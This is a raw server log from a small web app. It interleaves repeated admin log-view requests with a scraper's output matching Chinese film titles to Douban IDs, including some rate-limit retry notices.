[pid: 8599|app: 0|req: 4/6] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:51:56 2020] GET /admin/view_log/?page=16 => generated 19969 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 8598|app: 0|req: 4/7] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:52:00 2020] GET /admin/view_log/?page=17 => generated 15011 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
刻在书桌上的时光 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 8598|app: 0|req: 5/8] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:52:38 2020] GET /admin/view_log/?page=17 => generated 15196 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 8599|app: 0|req: 5/9] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:52:45 2020] GET /admin/view_log/?page=16 => generated 19969 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 8599|app: 0|req: 6/10] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:52:51 2020] GET /admin/view_log/?page=17 => generated 15306 bytes in 21 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 8598|app: 0|req: 6/11] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:54:13 2020] GET /admin/view_log/?page=17 => generated 15361 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 8598|app: 0|req: 7/12] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:54:54 2020] GET /admin/view_log/?page=17 => generated 15416 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
雪豹之虎啸军魂 34943661 0保存成功[douban]
大神猴3情劫篇 35074095 0保存成功[douban]
囍门洗笑录 30465830 0保存成功[douban]
等爱2020 未匹配到合适id
等爱2020 无豆瓣id数据，存入列表
史酷比狗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 8598|app: 0|req: 8/13] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:55:48 2020] GET /admin/view_log/?page=17 => generated 15798 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
江东战神少年周瑜 35073225 0保存成功[douban]
八岐大蛇 35048813 0保存成功[douban]
童年2020 未匹配到合适id
童年2020 无豆瓣id数据，存入列表
特殊保镖2 33439935 0保存成功[douban]
关于哈利的那些事 34887994 6.6保存成功[douban]
萌宠奇缘 35081834 0保存成功[douban]
咸鱼要翻身 35081833 0保存成功[douban]
春潮 未匹配到合适id
春潮 无豆瓣id数据，存入列表
继承2020 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[1590854402] logsize: 95184, triggering log-reopen...
